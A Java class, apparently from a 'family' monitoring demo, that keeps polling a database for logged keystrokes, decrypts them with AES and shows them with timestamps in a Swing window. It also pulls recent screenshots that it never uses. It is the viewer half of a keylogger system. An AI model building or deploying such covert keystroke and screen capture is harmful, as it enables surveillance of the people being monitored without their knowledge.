package com.family.server.controller;

import java.awt.Font;
import java.security.KeyStore;
import java.util.ArrayList;
import java.util.List;

import javax.swing.JFrame;
import javax.swing.JScrollPane;
import javax.swing.JTextArea;

import com.family.server.model.KeyStroke;
import com.family.server.model.Screenshot;
import com.family.server.repository.KeyStrokeDAO;
import com.family.server.repository.ScreenshotDAO;
import com.family.server.service.DecipherAES;

public class keystoreController extends Thread {
	private final JFrame frame = new JFrame("Demo - từ khóa được gửi lên server");
	private final JTextArea area = new JTextArea();
	
	public keystoreController()
	{
		frame.setSize(800,600);
		frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		area.setEditable(false);
        area.setFont(new Font("Consolas", Font.PLAIN, 14));
        frame.add(new JScrollPane(area));
        frame.setVisible(true);
	}
	
	public void run()
	{
		while(true)
		{
			try
			{
				KeyStrokeDAO ksDAO = new KeyStrokeDAO();
				List<KeyStroke> lks = ksDAO.GetAll();
				ksDAO.close();
				ScreenshotDAO sDao = new ScreenshotDAO();
				List<Screenshot> ls = sDao.getLatest(10);
				sDao.close();
				area.setText("");
				for(KeyStroke ks : lks)
				{
					String str = DecipherAES.Decipher(ks.getTextEnc(), ks.getIv());
					
					area.append(ks.getCreateAt() + " | " + str + "\n");
				}
				
				Thread.sleep(2000);
			}
			catch(Exception e)
			{
				e.printStackTrace();
			}
			
		}
	}
	
	
}
